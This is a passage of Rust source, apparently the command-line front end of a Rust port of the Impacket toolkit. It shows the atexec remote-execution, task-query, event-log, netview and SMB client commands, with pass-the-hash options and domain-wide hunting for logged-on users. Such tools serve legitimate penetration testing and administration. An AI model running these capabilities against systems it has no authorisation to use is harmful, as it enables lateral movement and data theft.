                "[-] Unknown Kerberos ticket format: magic byte 0x{:02X} (expected 0x76 for .kirbi or 0x05 for .ccache)",
                other
            );
            std::process::exit(1);
        }
    }
}

fn cmd_atexec(args: &[String]) {
    print!("{}", version::BANNER);
    let spec = match parse_target_with_hashes(args) {
        Ok(s) => s,
        Err(e) => {
            eprintln!("[-] {}", e);
            std::process::exit(1);
        }
    };
    let command = match positional_after_target(args) {
        Some(c) => c,
        None => {
            eprintln!("[-] atexec needs a command: atexec <TARGET> \"<command>\" [-hashes :NT]");
            std::process::exit(1);
        }
    };
    let cred = match credential_from(&spec) {
        Ok(c) => c,
        Err(e) => {
            eprintln!("[-] {}", e);
            std::process::exit(1);
        }
    };
    match impacket_msrpc::exec::atexec(
        spec.effective_target_ip(),
        &spec.domain,
        &spec.username,
        &cred,
        &command,
        spec.compat_profile,
        DEFAULT_TIMEOUT,
    ) {
        Ok(output) => {
            print!("{}", output);
            if !output.ends_with('\n') {
                println!();
            }
        }
        Err(e) => {
            eprintln!("[-] atexec error: {}", e);
            std::process::exit(1);
        }
    }
}

fn cmd_atq(args: &[String]) {
    print!("{}", version::BANNER);
    if args.is_empty() {
        println!("Usage: atq <TARGET> [-hashes LM:NT] [options]");
        println!();
        println!("Options:");
        println!("  -path <FOLDER>     Folder path to query (default: '\\')");
        println!("  -recursive         Recursively enumerate all tasks across all subfolders");
        println!("  -info <TASK_PATH>  Query task enabled status, operational state, and XML definition");
        println!("  -xml <TASK_PATH>   Retrieve raw task XML configuration definition");
        println!("  -hashes LM:NT      NTLM pass-the-hash authentication");
        return;
    }
    let spec = match parse_target_with_hashes(args) {
        Ok(s) => s,
        Err(e) => {
            eprintln!("[-] {}", e);
            std::process::exit(1);
        }
    };

    let mut task_target: Option<String> = None;
    let mut xml_only = false;
    let mut query_path = "\\".to_string();
    let mut recursive = false;
    let mut i = 0;
    while i < args.len() {
        if (args[i] == "-info" || args[i] == "-task") && i + 1 < args.len() {
            task_target = Some(args[i + 1].clone());
            i += 2;
            continue;
        }
        if args[i] == "-xml" && i + 1 < args.len() {
            task_target = Some(args[i + 1].clone());
            xml_only = true;
            i += 2;
            continue;
        }
        if args[i] == "-path" && i + 1 < args.len() {
            query_path = args[i + 1].clone();
            i += 2;
            continue;
        }
        if args[i] == "-recursive" || args[i] == "-all" || args[i] == "-r" {
            recursive = true;
        }
        i += 1;
    }

    println!("[*] Connecting to Task Scheduler Service (MS-TSCH) on {}...", spec.effective_target_ip());
    match open_pipe_transport(&spec, "atsvc", IFACE_TSCH) {
        Ok(transport) => {
            let mut client = TschClient::new(transport);
            if let Some(ref task) = task_target {
                if xml_only {
                    println!("[*] Retrieving XML for task '{}'...", task);
                    match client.retrieve_task(task) {
                        Ok(xml) => println!("{}", xml),
                        Err(e) => eprintln!("[-] SchRpcRetrieveTask error: {}", e),
                    }
                } else {
                    println!("[*] Inspecting task '{}'...", task);
                    match client.get_task_info(task) {
                        Ok(info) => {
                            println!("[+] Task Information:");
                            println!("    Enabled : {}", info.enabled);
                            println!("    State   : {}", info.state.name());
                        }
                        Err(e) => eprintln!("[-] SchRpcGetTaskInfo error: {}", e),
                    }
                    match client.retrieve_task(task) {
                        Ok(xml) => {
                            println!("[+] Task Definition XML:");
                            println!("{}", xml);
                        }
                        Err(e) => eprintln!("[-] SchRpcRetrieveTask error: {}", e),
                    }
                }
            } else if recursive {
                println!("[*] Recursively enumerating tasks under '{}'...", query_path);
                match client.enum_all_tasks_recursive(&query_path) {
                    Ok(tasks) => {
                        println!("[+] Found {} tasks:", tasks.len());
                        for t in &tasks {
                            println!("  {}", t);
                        }
                    }
                    Err(e) => eprintln!("[-] Error enumerating tasks: {}", e),
                }
            } else {
                println!("[*] Enumerating tasks and folders in '{}'...", query_path);
                match client.enum_tasks(&query_path) {
                    Ok(tasks) => {
                        println!("[+] Tasks in '{}' ({}):", query_path, tasks.len());
                        for t in &tasks {
                            println!("  [Task]   {}", t);
                        }
                    }
                    Err(e) => eprintln!("[-] Error enumerating tasks: {}", e),
                }
                match client.enum_folders(&query_path) {
                    Ok(folders) => {
                        println!("[+] Folders in '{}' ({}):", query_path, folders.len());
                        for f in &folders {
                            println!("  [Folder] {}", f);
                        }
                    }
                    Err(e) => eprintln!("[-] Error enumerating folders: {}", e),
                }
            }
        }
        Err(e) => eprintln!("[-] Failed opening \\PIPE\\atsvc: {}", e),
    }
}

fn cmd_eventlog(args: &[String]) {
    print!("{}", version::BANNER);
    if args.is_empty() {
        println!("Usage: eventlog <TARGET> [-hashes LM:NT] [options]");
        println!();
        println!("Windows Event Log remote reader over MS-EVEN6 (\\PIPE\\eventlog)");
        println!();
        println!("Options:");
        println!("  -channel, -c <NAME>   Channel name (e.g. 'Security', 'System', 'Application'). Default: System");
        println!("  -xpath, -q <QUERY>    XPath query filter (e.g. '*[System[(EventID=4624)]]'). Default: '*'");
        println!("  -max, -n <COUNT>      Maximum events to retrieve (default: 20)");
        println!("  -reverse, -r          Read newest events first (default: true)");
        println!("  -forward              Read oldest events first");
        println!("  -xml                  Display full reconstructed XML instead of single-line summary");
        println!("  -pipe <PIPE>          Named pipe (default: \\PIPE\\eventlog)");
        println!("  -hashes LM:NT         NTLM pass-the-hash authentication");
        return;
    }

    let spec = match parse_target_with_hashes(args) {
        Ok(s) => s,
        Err(e) => {
            eprintln!("[-] {}", e);
            std::process::exit(1);
        }
    };

    let mut channel = "System".to_string();
    let mut xpath_query = "*".to_string();
    let mut max_count: u32 = 20;
    let mut reverse = true;
    let mut show_xml = false;
    let mut pipe_name = r"\PIPE\eventlog".to_string();

    let mut i = 1;
    while i < args.len() {
        match args[i].as_str() {
            "-channel" | "-c" if i + 1 < args.len() => {
                channel = args[i + 1].clone();
                i += 2;
            }
            "-xpath" | "-q" if i + 1 < args.len() => {
                xpath_query = args[i + 1].clone();
                i += 2;
            }
            "-max" | "-n" if i + 1 < args.len() => {
                max_count = args[i + 1].parse().unwrap_or(20);
                i += 2;
            }
            "-reverse" | "-r" => {
                reverse = true;
                i += 1;
            }
            "-forward" => {
                reverse = false;
                i += 1;
            }
            "-xml" => {
                show_xml = true;
                i += 1;
            }
            "-pipe" if i + 1 < args.len() => {
                pipe_name = args[i + 1].clone();
                i += 2;
            }
            _ => i += 1,
        }
    }

    println!("[*] Connecting to {} over {}...", spec.effective_target_ip(), pipe_name);
    match open_pipe_transport(&spec, &pipe_name, IFACE_EVEN6) {
        Ok(transport) => {
            let mut client = impacket_msrpc::even6::Even6Client::new(transport);
            let dir_str = if reverse { "reverse (newest first)" } else { "forward (oldest first)" };
            println!(
                "[*] Querying channel '{}' with query '{}' (max: {}, {})...",
                channel, xpath_query, max_count, dir_str
            );

            match client.fetch_events(&channel, &xpath_query, max_count, reverse) {
                Ok(events) => {
                    if events.is_empty() {
                        println!("[*] No events returned matching query.");
                    } else {
                        println!("[+] Retrieved {} event(s):", events.len());
                        println!();
                        for (idx, evt) in events.iter().enumerate() {
                            if show_xml {
                                println!("--- Event #{} ---", idx + 1);
                                println!("{}", evt.to_xml_string());
                                println!();
                            } else {
                                println!("  [{}] {}", idx + 1, evt.to_summary_string());
                                if !evt.data_strings.is_empty() {
                                    println!("      Data: {}", evt.data_strings.join(", "));
                                }
                            }
                        }
                    }
                }
                Err(e) => {
                    eprintln!("[-] Failed to query event log: {}", e);
                    std::process::exit(1);
                }
            }
        }
        Err(e) => {
            eprintln!("[-] Failed opening {}: {}", pipe_name, e);
            std::process::exit(1);
        }
    }
}

fn netview_single_target(
    spec: &TargetSpec,
    do_shares: bool,
    do_sessions: bool,
    do_files: bool,
    do_users: bool,
    do_info: bool,
    check_user: Option<&str>,
) {
    let server_name = format!(r"\\{}", spec.effective_target_ip());

    if do_shares || do_sessions || do_files {
        println!("[*] Connecting to Server Service (MS-SRVS) on {}...", spec.effective_target_ip());
        match open_pipe_transport(spec, "srvsvc", IFACE_SRVS) {
            Ok(transport) => {
                let mut client = SrvsClient::new(transport);
                if do_shares {
                    match client.net_share_enum(&server_name) {
                        Ok(shares) => {
                            println!("[*] Enumerated {} shares on {}:", shares.len(), spec.effective_target_ip());
                            for s in &shares {
                                println!("  {:<18} {:<16} {}", s.netname, s.share_type.name(), s.remark);
                            }
                        }
                        Err(e) => eprintln!("[-] NetrShareEnum error: {}", e),
                    }
                }
                if do_sessions {
                    match client.net_session_enum(&server_name) {
                        Ok(sessions) => {
                            println!("[*] Enumerated {} active sessions on {}:", sessions.len(), spec.effective_target_ip());
                            for s in &sessions {
                                if let Some(target_u) = check_user {
                                    if s.username.eq_ignore_ascii_case(target_u) {
                                        println!(
                                            "[!!!] TARGET USER DETECTED: '{}' active on {} (client: {})",
                                            s.username, spec.effective_target_ip(), s.client_name
                                        );
                                    }
                                }
                                println!(
                                    "  {:<20} User: {:<16} Active: {}s Idle: {}s",
                                    s.client_name, s.username, s.active_time_secs, s.idle_time_secs
                                );
                            }
                        }
                        Err(e) => eprintln!("[-] NetrSessionEnum error: {}", e),
                    }
                }
                if do_files {
                    match client.net_file_enum(&server_name) {
                        Ok(files) => {
                            println!("[*] Enumerated {} open files on {}:", files.len(), spec.effective_target_ip());
                            for f in &files {
                                if let Some(target_u) = check_user {
                                    if f.user_name.eq_ignore_ascii_case(target_u) {
                                        println!(
                                            "[!!!] TARGET USER FILE LOCK: '{}' open file on {} ('{}')",
                                            f.user_name, spec.effective_target_ip(), f.path_name
                                        );
                                    }
                                }
                                println!(
                                    "  ID: {:<6} Perms: {:<12} Locks: {:<4} User: {:<16} Path: {}",
                                    f.id, f.permissions_string(), f.num_locks, f.user_name, f.path_name
                                );
                            }
                        }
                        Err(e) => eprintln!("[-] NetrFileEnum error: {}", e),
                    }
                }
            }
            Err(e) => eprintln!("[-] Failed opening \\PIPE\\srvsvc: {}", e),
        }
    }

    if do_info || do_users {
        println!("[*] Connecting to Workstation Service (MS-WKST) on {}...", spec.effective_target_ip());
        match open_pipe_transport(spec, "wkssvc", IFACE_WKST) {
            Ok(transport) => {
                let mut client = WkstClient::new(transport);
                if do_info {
                    match client.get_info(&server_name) {
                        Ok(info) => {
                            println!("[+] Workstation Information:");
                            println!("    Computer Name : {}", info.computer_name);
                            println!("    LAN Group     : {}", info.langroup);
                            println!("    Platform ID   : {}", info.platform_id);
                            println!("    Version       : {}.{}", info.ver_major, info.ver_minor);
                        }
                        Err(e) => eprintln!("[-] NetrWkstaGetInfo error: {}", e),
                    }
                    match client.get_join_information(&server_name) {
                        Ok((join_name, join_status)) => {
                            println!("[+] Join Information:");
                            println!("    Join Name     : {}", join_name);
                            println!("    Join Status   : {}", join_status.name());
                        }
                        Err(e) => eprintln!("[-] NetrGetJoinInformation error: {}", e),
                    }
                }
                if do_users {
                    match client.enumerate_users(&server_name) {
                        Ok(users) => {
                            println!("[*] Enumerated {} logged-on users on {}:", users.len(), spec.effective_target_ip());
                            for u in &users {
                                if let Some(target_u) = check_user {
                                    if u.username.eq_ignore_ascii_case(target_u) {
                                        println!(
                                            "[!!!] TARGET USER LOGGED ON: '{}' on {} (Domain: {})",
                                            u.username, spec.effective_target_ip(), u.logon_domain
                                        );
                                    }
                                }
                                println!("  {:<20} Domain: {:<16} Server: {}", u.username, u.logon_domain, u.logon_server);
                            }
                        }
                        Err(e) => eprintln!("[-] NetrWkstaUserEnum error: {}", e),
                    }
                }
            }
            Err(e) => eprintln!("[-] Failed opening \\PIPE\\wkssvc: {}", e),
        }
    }
}

fn cmd_netview(args: &[String]) {
    print!("{}", version::BANNER);
    if args.is_empty() || args.iter().any(|a| a == "-h" || a == "--help") {
        println!("Usage: netview <TARGET> [options]");
        println!("       netview -targets <FILE> [options]");
        println!("       netview <DC_TARGET> -domain [options]");
        println!();
        println!("Options:");
        println!("  -shares            Enumerate SMB file shares over MS-SRVS (\\PIPE\\srvsvc)");
        println!("  -sessions          Enumerate active network sessions over MS-SRVS (\\PIPE\\srvsvc)");
        println!("  -files             Enumerate opened files and locks over MS-SRVS (\\PIPE\\srvsvc)");
        println!("  -users             Enumerate currently logged-on users over MS-WKST (\\PIPE\\wkssvc)");
        println!("  -info              Query workstation OS & domain join info over MS-WKST (\\PIPE\\wkssvc)");
        println!("  -check-user <U>    Highlight when target user <U> is found in sessions or logged on");
        println!("  -targets <FILE>    Crawl multiple target hosts from a text file");
        println!("  -domain            Crawl all domain computers discovered via LDAP on target DC");
        println!("  -hashes LM:NT      NTLM pass-the-hash authentication");
        return;
    }

    let mut targets_file: Option<String> = None;
    let mut check_user: Option<String> = None;
    let mut crawl_domain = false;
    let mut rest_args = Vec::new();

    let mut i = 0;
    while i < args.len() {
        if args[i] == "-targets" && i + 1 < args.len() {
            targets_file = Some(args[i + 1].clone());
            i += 2;
        } else if args[i] == "-check-user" && i + 1 < args.len() {
            check_user = Some(args[i + 1].clone());
            i += 2;
        } else if args[i] == "-domain" {
            crawl_domain = true;
            i += 1;
        } else {
            rest_args.push(args[i].clone());
            i += 1;
        }
    }

    let do_users = args.iter().any(|a| a == "-users" || a == "-user");
    let do_info = args.iter().any(|a| a == "-info");
    let do_sessions = args.iter().any(|a| a == "-sessions" || a == "-session");
    let do_files = args.iter().any(|a| a == "-files" || a == "-file");
    let do_shares = (!do_users && !do_info && !do_sessions && !do_files) || args.iter().any(|a| a == "-shares");

    if let Some(tfile) = targets_file {
        println!("[*] Reading target hosts from file '{}'...", tfile);
        let content = match std::fs::read_to_string(&tfile) {
            Ok(c) => c,
            Err(e) => {
                eprintln!("[-] Failed reading targets file: {}", e);
                std::process::exit(1);
            }
        };

        let base_spec = parse_target_with_hashes(&rest_args).unwrap_or_else(|_| TargetSpec {
            domain: String::new(),
            username: String::new(),
            password: None,
            remote_name: String::new(),
            dc_ip: None,
            target_ip: None,
            use_kerberos: false,
            no_pass: false,
            hashes: None,
            aes_key: None,
            compat_profile: AdCompatProfile::UniversalAuto,
        });

        for line in content.lines() {
            let host = line.trim();
            if host.is_empty() || host.starts_with('#') {
                continue;
            }
            println!("\n=== Target: {} ===", host);
            let mut spec = base_spec.clone();
            spec.remote_name = host.to_string();
            spec.target_ip = None;
            netview_single_target(&spec, do_shares, do_sessions, do_files, do_users, do_info, check_user.as_deref());
        }
        return;
    }

    let spec = match parse_target_with_hashes(&rest_args) {
        Ok(s) => s,
        Err(e) => {
            eprintln!("[-] {}", e);
            std::process::exit(1);
        }
    };

    if crawl_domain {
        println!("[*] Discovering domain computers via LDAP on {}...", spec.effective_target_ip());
        let addr = format!("{}:389", spec.effective_target_ip());
        let mut ldap = match LdapClient::connect(&addr, DEFAULT_TIMEOUT) {
            Ok(c) => c,
            Err(e) => {
                eprintln!("[-] LDAP connection failed: {}", e);
                std::process::exit(1);
            }
        };

        let bind_dn = if spec.username.is_empty() {
            String::new()
        } else if spec.username.contains('@') {
            spec.username.clone()
        } else if !spec.domain.is_empty() {
            format!("{}@{}", spec.username, spec.domain)
        } else {
            spec.username.clone()
        };
        let pass = spec.password.as_ref().map(|p| p.expose_secret()).unwrap_or("");
        if !bind_dn.is_empty() {
            let _ = ldap.bind_simple(&bind_dn, pass);
        }

        let base_dn = if !spec.domain.is_empty() {
            spec.domain.split('.').map(|p| format!("DC={}", p)).collect::<Vec<_>>().join(",")
        } else {
            String::new()
        };

        let filter = "(&(objectCategory=computer)(operatingSystem=*))";
        let computers = ldap.search(&base_dn, SearchScope::WholeSubtree, filter.as_bytes(), &["dNSHostName", "name"]).unwrap_or_default();
        println!("[+] Found {} domain computers to crawl.", computers.len());

        for c in computers {
            let target_host = c.get_first_raw("dNSHostName")
                .or_else(|| c.get_first_raw("name"))
                .map(|b| String::from_utf8_lossy(b).into_owned());
            if let Some(host) = target_host {
                println!("\n=== Domain Host: {} ===", host);
                let mut host_spec = spec.clone();
                host_spec.remote_name = host;
                host_spec.target_ip = None;
                netview_single_target(&host_spec, do_shares, do_sessions, do_files, do_users, do_info, check_user.as_deref());
            }
        }
        return;
    }

    netview_single_target(&spec, do_shares, do_sessions, do_files, do_users, do_info, check_user.as_deref());
}

fn smb_download_recursive(
    conn: &mut impacket_smb::SmbConnection,
    remote_path: &str,
    local_path: &std::path::Path,
) -> Result<usize, impacket_core::CoreError> {
    std::fs::create_dir_all(local_path).map_err(|e| {
        impacket_core::CoreError::ProtocolError(format!(
            "Failed creating local directory '{}': {}",
            local_path.display(),
            e
        ))
    })?;

    let entries = conn.list_directory(remote_path)?;
    let mut count = 0;
    for entry in entries {
        if entry.name == "." || entry.name == ".." {
            continue;
        }
        let child_remote = if remote_path.is_empty() {
            entry.name.clone()
        } else {
            format!(r"{}\{}", remote_path.trim_end_matches('\\'), entry.name)
        };
        let child_local = local_path.join(&entry.name);
        if entry.is_directory {
            count += smb_download_recursive(conn, &child_remote, &child_local)?;
        } else {
            match conn.read_full_file(&child_remote) {
                Ok(data) => {
                    if let Err(e) = std::fs::write(&child_local, &data) {
                        eprintln!("[-] failed writing '{}': {}", child_local.display(), e);
                    } else {
                        println!(
                            "[+] Downloaded {} ({} bytes) -> {}",
                            child_remote,
                            data.len(),
                            child_local.display()
                        );
                        count += 1;
                    }
                }
                Err(e) => eprintln!("[-] failed reading remote file '{}': {}", child_remote, e),
            }
        }
    }
    Ok(count)
}

fn smb_upload_recursive(
    conn: &mut impacket_smb::SmbConnection,
    local_path: &std::path::Path,
    remote_path: &str,
) -> Result<usize, impacket_core::CoreError> {
    if !remote_path.is_empty() {
        let _ = conn.create_directory(remote_path);
    }
    let read_dir = std::fs::read_dir(local_path).map_err(|e| {
        impacket_core::CoreError::ProtocolError(format!(
            "Failed reading local directory '{}': {}",
            local_path.display(),
            e
        ))
    })?;

    let mut count = 0;
    for res in read_dir {
        let entry = match res {
            Ok(e) => e,
            Err(_) => continue,
        };
        let file_type = match entry.file_type() {
            Ok(t) => t,
            Err(_) => continue,
        };
        let file_name = entry.file_name().to_string_lossy().to_string();
        let child_remote = if remote_path.is_empty() {
            file_name.clone()
        } else {
            format!(r"{}\{}", remote_path.trim_end_matches('\\'), file_name)
        };
        if file_type.is_dir() {
            count += smb_upload_recursive(conn, &entry.path(), &child_remote)?;
        } else {
            match std::fs::read(entry.path()) {
                Ok(data) => {
                    if let Err(e) = conn.write_full_file(&child_remote, &data) {
                        eprintln!("[-] failed uploading to '{}': {}", child_remote, e);
                    } else {
                        println!(
                            "[+] Uploaded {} ({} bytes) -> {}",
                            entry.path().display(),
                            data.len(),
                            child_remote
                        );
                        count += 1;
                    }
                }
                Err(e) => eprintln!(
                    "[-] failed reading local file '{}': {}",
                    entry.path().display(),
                    e
                ),
            }
        }
    }
    Ok(count)
}

fn cmd_smbclient(args: &[String]) {
    use std::io::{self, Write};
    print!("{}", version::BANNER);
    let spec = match parse_target_with_hashes(args) {
        Ok(s) => s,
        Err(e) => {
            eprintln!("[-] {}", e);
            std::process::exit(1);
        }
    };
    let cred = match credential_from(&spec) {
        Ok(c) => c,
        Err(e) => {
            eprintln!("[-] {}", e);
            std::process::exit(1);
        }
    };
    let host = spec.effective_target_ip();
    let positionals = positionals_after_target(args);

    let mut conn = match impacket_smb::SmbConnection::connect(host, 445, spec.compat_profile, DEFAULT_TIMEOUT) {
        Ok(c) => c,
        Err(e) => {
            eprintln!("[-] SMB connect error: {}", e);
            std::process::exit(1);
        }
    };

    if let Err(e) = conn.login(&spec.domain, &spec.username, &cred, "impacket-rs") {
        eprintln!("[-] SMB authentication error: {}", e);
        std::process::exit(1);
    }

    let dialect_name = SmbDialect::from_u16(conn.negotiated_dialect())
        .map(|d| d.name())
        .unwrap_or("Unknown");
    println!(
        "[+] Authenticated as {}\\{} via {} (signed: {})",
        spec.domain, spec.username, dialect_name, conn.signing_required()
    );

    let mut batch_commands: Vec<String> = Vec::new();
    let mut b_idx = 0;
    while b_idx < args.len() {
        if args[b_idx] == "-batch" && b_idx + 1 < args.len() {
            if let Ok(content) = std::fs::read_to_string(&args[b_idx + 1]) {
                for line in content.lines() {
                    let t = line.trim();
                    if !t.is_empty() && !t.starts_with('#') {
                        batch_commands.push(t.to_string());
                    }
                }
            } else {
                eprintln!("[-] Cannot open batch file '{}'", args[b_idx + 1]);
                std::process::exit(1);
            }
            b_idx += 2;
        } else if args[b_idx] == "-c" && b_idx + 1 < args.len() {
            for cmd in args[b_idx + 1].split(';') {
                let t = cmd.trim();
                if !t.is_empty() {
                    batch_commands.push(t.to_string());
                }
            }
            b_idx += 2;
        } else {
            b_idx += 1;
        }
    }

    if positionals.is_empty() || positionals[0] == "interactive" || !batch_commands.is_empty() {
        if batch_commands.is_empty() {
            println!("[*] Type 'help' for commands, 'exit' to quit.");
        } else {
            println!("[*] Executing {} batch command(s)...", batch_commands.len());
        }
        let mut current_share: Option<String> = None;
        let stdin = io::stdin();
        let is_batch = !batch_commands.is_empty();
        let mut batch_i = 0;
        loop {
            let prompt = match &current_share {
                Some(s) => format!("smb: \\\\{}\\{}> ", host, s),
                None => format!("smb: \\\\{}> ", host),
            };
            let cmd_str = if is_batch {
                if batch_i >= batch_commands.len() {
                    break;
                }
                let c = batch_commands[batch_i].clone();
                println!("{}{}", prompt, c);
                batch_i += 1;
                c
            } else {
                print!("{}", prompt);
                let _ = io::stdout().flush();
                let mut line = String::new();
                if stdin.read_line(&mut line).unwrap_or(0) == 0 {
                    break;
                }
                line.trim().to_string()
            };
            if cmd_str.is_empty() {
                continue;
            }
            let parts: Vec<&str> = cmd_str.split_whitespace().collect();
            match parts[0] {
                "exit" | "quit" | "q" => break,
                "help" | "?" => {
                    println!("Commands:");
                    println!("  shares                                   List remote shares");
                    println!("  use <share>                              Connect to a share");
                    println!("  ls [path]                                List directory contents");
                    println!("  get <remote_file> [local_file]           Download file");
                    println!("  mget <remote_dir> [local_dir]            Download directory recursively");
                    println!("  put <local_file> [remote_file]           Upload file");
                    println!("  mput <local_dir> [remote_dir]            Upload directory recursively");
                    println!("  mkdir <remote_dir>                       Create remote directory");
                    println!("  rmdir <remote_dir>                       Delete remote directory");
                    println!("  cat <remote_file>                        Print file contents");
                    println!("  rm <remote_file>                         Delete remote file");
                    println!("  encrypt [on|off]                         Toggle SMB3 encryption");
                    println!("  info                                     Session info");
                    println!("  exit                                     Disconnect");
                }
                "shares" => match open_pipe_transport(&spec, "srvsvc", IFACE_SRVS) {
                    Ok(transport) => {
                        let mut client = SrvsClient::new(transport);
                        let server_name = format!(r"\\{}", host);
                        match client.net_share_enum(&server_name) {
                            Ok(shares) => {
                                println!("{:<18} {:<16} {}", "Share", "Type", "Remark");
                                println!("{:-<18} {:-<16} {:-<20}", "", "", "");
                                for s in &shares {
                                    println!("{:<18} {:<16} {}", s.netname, s.share_type.name(), s.remark);
                                }
                            }
                            Err(e) => eprintln!("[-] failed listing shares: {}", e),
                        }
                    }
                    Err(e) => eprintln!("[-] srvsvc transport error: {}", e),
                },
                "use" => {
                    if parts.len() < 2 {
                        eprintln!("[-] usage: use <share>");
                        continue;
                    }
                    let share = parts[1].trim_start_matches('\\');
                    match conn.tree_connect_share(host, share) {
                        Ok(_) => {
                            println!("[+] Connected to share '{}'", share);
                            current_share = Some(share.to_string());
                        }
                        Err(e) => eprintln!("[-] failed connecting to share '{}': {}", share, e),
                    }
                }
                "ls" | "dir" => {
                    if current_share.is_none() {
                        eprintln!("[-] Select a share first with 'use <share>'");
                        continue;
                    }
                    let path = parts.get(1).copied().unwrap_or("");
                    match conn.list_directory(path) {
                        Ok(entries) => display_directory_listing(&entries),
                        Err(e) => eprintln!("[-] list directory error: {}", e),
                    }
                }
                "get" => {
                    if current_share.is_none() {
                        eprintln!("[-] Select a share first with 'use <share>'");
                        continue;
                    }
                    if parts.len() < 2 {
                        eprintln!("[-] usage: get <remote_file> [local_file]");
                        continue;
                    }
                    let remote_path = parts[1];
                    let local_path = parts.get(2).copied().unwrap_or_else(|| {
                        remote_path.rsplit(&['/', '\\'][..]).next().unwrap_or(remote_path)
                    });
                    match conn.read_full_file(remote_path) {
                        Ok(data) => match std::fs::write(local_path, &data) {
                            Ok(_) => println!("[+] Downloaded {} ({} bytes) -> {}", remote_path, data.len(), local_path),
                            Err(e) => eprintln!("[-] failed writing local file '{}': {}", local_path, e),
                        },
                        Err(e) => eprintln!("[-] read error: {}", e),
                    }
                }
                "put" => {
                    if current_share.is_none() {
                        eprintln!("[-] Select a share first with 'use <share>'");
                        continue;
                    }
                    if parts.len() < 2 {
                        eprintln!("[-] usage: put <local_file> [remote_file]");
                        continue;
                    }
                    let local_path = parts[1];
                    let remote_path = parts.get(2).copied().unwrap_or_else(|| {
                        local_path.rsplit(&['/', '\\'][..]).next().unwrap_or(local_path)
                    });
                    match std::fs::read(local_path) {
                        Ok(data) => match conn.write_full_file(remote_path, &data) {
                            Ok(_) => println!("[+] Uploaded {} ({} bytes) -> {}", local_path, data.len(), remote_path),
                            Err(e) => eprintln!("[-] write error: {}", e),
                        },
                        Err(e) => eprintln!("[-] failed reading local file '{}': {}", local_path, e),
                    }
                }
                "cat" => {
                    if current_share.is_none() {
                        eprintln!("[-] Select a share first with 'use <share>'");
                        continue;
                    }
                    if parts.len() < 2 {
                        eprintln!("[-] usage: cat <remote_file>");
                        continue;
                    }
                    match conn.read_full_file(parts[1]) {
                        Ok(data) => {
                            let _ = io::stdout().write_all(&data);
                            if !data.ends_with(b"\n") {
                                println!();
                            }
                        }
                        Err(e) => eprintln!("[-] cat error: {}", e),
                    }
                }
                "rm" | "del" => {
                    if current_share.is_none() {
                        eprintln!("[-] Select a share first with 'use <share>'");
                        continue;
                    }
                    if parts.len() < 2 {
                        eprintln!("[-] usage: rm <remote_file>");
                        continue;
                    }
                    match conn.delete_file(parts[1]) {
                        Ok(_) => println!("[+] Deleted '{}'", parts[1]),
                        Err(e) => eprintln!("[-] delete error: {}", e),
                    }
                }
                "mget" => {
                    if current_share.is_none() {
                        eprintln!("[-] Select a share first with 'use <share>'");
                        continue;
                    }
                    if parts.len() < 2 {
                        eprintln!("[-] usage: mget <remote_dir> [local_dir]");
                        continue;
                    }
                    let remote_dir = parts[1];
                    let local_dir = std::path::PathBuf::from(parts.get(2).copied().unwrap_or("."));
                    match smb_download_recursive(&mut conn, remote_dir, &local_dir) {
                        Ok(n) => println!(
                            "[+] Downloaded {} total files into '{}'",
                            n,
                            local_dir.display()
                        ),
                        Err(e) => eprintln!("[-] mget error: {}", e),
                    }
                }
                "mput" => {
                    if current_share.is_none() {
                        eprintln!("[-] Select a share first with 'use <share>'");
                        continue;
                    }
                    if parts.len() < 2 {
                        eprintln!("[-] usage: mput <local_dir> [remote_dir]");
                        continue;
                    }
                    let local_dir = std::path::Path::new(parts[1]);
                    let remote_dir = parts.get(2).copied().unwrap_or("");
                    match smb_upload_recursive(&mut conn, local_dir, remote_dir) {
                        Ok(n) => println!("[+] Uploaded {} total files to '{}'", n, remote_dir),
                        Err(e) => eprintln!("[-] mput error: {}", e),
                    }
                }
                "mkdir" => {
                    if current_share.is_none() {
                        eprintln!("[-] Select a share first with 'use <share>'");
                        continue;
                    }
                    if parts.len() < 2 {
                        eprintln!("[-] usage: mkdir <remote_directory>");
                        continue;
                    }
                    match conn.create_directory(parts[1]) {
                        Ok(_) => println!("[+] Created directory '{}'", parts[1]),
                        Err(e) => eprintln!("[-] mkdir error: {}", e),
                    }
                }
                "rmdir" => {
                    if current_share.is_none() {
                        eprintln!("[-] Select a share first with 'use <share>'");
                        continue;
                    }
                    if parts.len() < 2 {
                        eprintln!("[-] usage: rmdir <remote_directory>");
                        continue;
                    }
                    match conn.delete_directory(parts[1]) {
                        Ok(_) => println!("[+] Deleted directory '{}'", parts[1]),
                        Err(e) => eprintln!("[-] rmdir error: {}", e),
                    }
                }
                "encrypt" => {
                    if parts.len() > 1 {
                        let enable = match parts[1] {
                            "on" | "1" | "true" => true,
                            "off" | "0" | "false" => false,
                            _ => {
                                eprintln!("[-] usage: encrypt [on|off]");
                                continue;
                            }
                        };
                        match conn.set_encryption(enable) {
                            Ok(_) => println!(
                                "[+] SMB3 encryption: {}",
                                if enable { "ENABLED" } else { "DISABLED" }
                            ),
                            Err(e) => eprintln!("[-] failed setting encryption: {}", e),
                        }
                    } else {
                        println!(
                            "SMB3 Encryption Status: {}",
                            if conn.is_encrypted() {
                                "ACTIVE"
                            } else {
                                "INACTIVE"
                            }
                        );
                    }
                }
                "info" => {
                    println!("Session Info:");
                    println!("  Host           : {}", host);
                    println!("  Dialect        : {}", dialect_name);
                    println!(
                        "  Signing        : {}",
                        if conn.signing_required() {
                            "Enforced"
                        } else {
                            "Enabled"
                        }
                    );
                    println!(
                        "  Encryption     : {}",
                        if conn.is_encrypted() {
                            "Enforced (AES-GCM/CCM)"
                        } else {
                            "Inactive"
                        }
                    );
                    println!("  Current Share  : {}", current_share.as_deref().unwrap_or("<none>"));
                }
                unknown => eprintln!("[-] unknown command '{}'. Type 'help' for available commands.", unknown),
            }
        }
        let _ = conn.tree_disconnect();
        let _ = conn.logoff();
    } else {
        match positionals[0].as_str() {
            "shares" => {
                let transport = match open_pipe_transport(&spec, "srvsvc", IFACE_SRVS) {
                    Ok(t) => t,
                    Err(e) => {
                        eprintln!("[-] srvsvc transport error: {}", e);
                        std::process::exit(1);
                    }
                };
                let mut client = SrvsClient::new(transport);
                let server_name = format!(r"\\{}", host);
                match client.net_share_enum(&server_name) {
                    Ok(shares) => {
                        println!("{:<18} {:<16} {}", "Share", "Type", "Remark");
                        println!("{:-<18} {:-<16} {:-<20}", "", "", "");
                        for s in &shares {
                            println!("{:<18} {:<16} {}", s.netname, s.share_type.name(), s.remark);
                        }
                    }
                    Err(e) => {
                        eprintln!("[-] failed listing shares: {}", e);
                        std::process::exit(1);
                    }
                }
            }
            "ls" | "dir" => {
                if positionals.len() < 2 {
                    eprintln!("[-] usage: smbclient <TARGET> ls <SHARE> [PATH]");
